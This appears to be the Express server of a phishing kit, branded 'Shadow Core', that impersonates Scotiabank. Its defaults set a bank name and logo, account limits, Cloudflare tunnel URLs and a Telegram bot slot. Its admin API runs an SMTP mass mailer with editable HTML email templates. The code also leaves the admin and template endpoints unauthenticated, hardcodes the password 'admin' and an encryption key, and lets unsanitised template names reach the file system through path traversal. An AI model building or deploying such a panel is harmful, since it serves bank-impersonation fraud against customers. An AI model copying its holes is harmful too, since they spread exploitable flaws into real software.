import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import fs from 'fs';
import http from 'http';
import nodemailer from 'nodemailer';
import { GlobalSettings } from './src/types/settings';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const settingsPath = path.join(process.cwd(), 'server', 'data', 'global_settings.json');

const defaultSettings: GlobalSettings = {
    general: { 
        app_url: "https://your-app.trycloudflare.com", 
        webroot_url: "https://sim.trycloudflare.com",
        sender_name: "SHΔDØW CORE", 
        encryption_key: "a3f91b6cd024e8c29b76a149efcc5d42",
        maintenanceMode: false,
        bank_name: "Scotiabank",
        bank_logo: "",
        overdraftLimit: 5000,
        transferLimit: 3000,
        dailyLimit: 10000,
        forceSupportChat: false,
        globalEnable: true,
        admin_password: "admin"
    },
    smtp: { host: "", port: 587, secure: false, user: "", pass: "", senderName: "Shadow Mailer" },
    telegram: { token: "", chat_id: "", enabled: false }
};

const getSettings = (): GlobalSettings => {
    let settings = { ...defaultSettings };
    try {
        if (fs.existsSync(settingsPath)) {
            const fileSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
            // Ensure compat with old file structure if needed
            settings = { ...settings, ...fileSettings };
        }
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Simulation settings unreachable. Using defaults.");
    }
    return settings;
};

async function startServer() {
  const app = express();
  const server = http.createServer(app);
  
  app.use(express.json());

  // AUTH API
  app.post("/api/auth/login", (req, res) => {
      const { username, password, pin } = req.body;
      const settings = getSettings();
      if (username === 'admin' && password === settings.general.admin_password && pin === settings.general.adminPin) {
          res.json({ success: true });
      } else {
          res.json({ success: false, message: 'Invalid credentials' });
      }
  });

  // ADMIN API
  app.get("/api/admin/global-settings", (req, res) => {
    res.json(getSettings());
  });

  app.post("/api/admin/global-settings", (req, res) => {
    try {
      const updated = { ...getSettings(), ...req.body };
      if (!fs.existsSync(path.dirname(settingsPath))) {
          fs.mkdirSync(path.dirname(settingsPath), { recursive: true });
      }
      fs.writeFileSync(settingsPath, JSON.stringify(updated, null, 2));
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ success: false, error: e.message });
    }
  });

  const sendEmail = async (to: string, subject: string, text: string, html: string) => {
      const settings = getSettings();
      const transporter = nodemailer.createTransport({
          host: settings.smtp.host,
          port: settings.smtp.port,
          secure: settings.smtp.secure,
          auth: {
              user: settings.smtp.user,
              pass: settings.smtp.pass
          }
      });
  
      await transporter.sendMail({
          from: `"${settings.smtp.senderName}" <${settings.smtp.user}>`,
          to,
          subject,
          text,
          html
      });
  };
  
  app.post("/api/admin/mailer/test", async (req, res) => {
      try {
          const { email } = req.body;
          await sendEmail(email, "Test Email", "This is a test email.", "<p>This is a test email.</p>");
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });

  app.get("/api/admin/mailer/status", (req, res) => {
      res.json({ php_version: "Node.js (Shadow)", status: "Operational", engine: "Shadow-V99" });
  });

  app.get("/api/admin/mailer/logs", (req, res) => {
      res.json([]);
  });

  app.post("/api/admin/mailer/delete-logs", (req, res) => {
      res.json({ success: true });
  });

  app.get("/api/admin/mailer/templates", (req, res) => {
      const templateDir = path.join(process.cwd(), 'server', 'templates');
      if (!fs.existsSync(templateDir)) {
          fs.mkdirSync(templateDir, { recursive: true });
      }
      const files = fs.readdirSync(templateDir).map(file => ({
          name: file,
          last_modified: fs.statSync(path.join(templateDir, file)).mtime.toISOString()
      }));
      res.json(files);
  });

  app.get("/api/admin/mailer/template-content", (req, res) => {
      const templateName = req.query.template as string;
      const templatePath = path.join(process.cwd(), 'server', 'templates', templateName);
      if (fs.existsSync(templatePath)) {
          res.json({ content: fs.readFileSync(templatePath, 'utf-8') });
      } else {
          res.status(404).json({ error: "Template not found" });
      }
  });

  app.post("/api/admin/mailer/update-template", (req, res) => {
      const { template, content } = req.body;
      const templatePath = path.join(process.cwd(), 'server', 'templates', template);
      try {
          if (!fs.existsSync(path.dirname(templatePath))) {
              fs.mkdirSync(path.dirname(templatePath), { recursive: true });
          }
          fs.writeFileSync(templatePath, content);
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });

  /**
   * FRONTEND DEPLOYMENT
   */
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const PORT = parseInt(process.env.PORT || '3000');
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`🔥 [Shadow-Core] OS Layer engaged at http://localhost:${PORT}`);
  });
}

// Engage mission
startServer().catch(err => {
    console.error("💥 [Critical] Shadow Core breakdown:", err);
});
